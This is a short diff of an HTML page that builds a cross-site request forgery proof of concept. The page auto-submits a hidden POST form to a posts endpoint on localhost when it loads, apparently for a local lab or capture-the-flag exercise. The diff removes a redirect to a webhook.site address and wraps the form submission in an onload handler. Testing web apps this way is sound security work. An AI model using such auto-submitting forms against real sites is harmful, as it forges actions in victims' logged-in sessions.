@@ -1,12 +1,16 @@
 <!DOCTYPE html>
+<html>
+<body>
+
 <form id="f" method="POST" action="http://localhost:3000/posts">
-  <textarea name="content">hello from admin</textarea>
+  <textarea name="content">test2</textarea>
 </form>
 
 <script>
-document.getElementById('f').submit();
-
-setTimeout(function(){
-  location="https://webhook.site/f0c4ea68-affd-4e9c-b7f0-55d40fec33b6";
-}, 1500);
+window.onload = function () {
+  document.getElementById('f').submit();
+};
 </script>
+
+</body>
+</html>
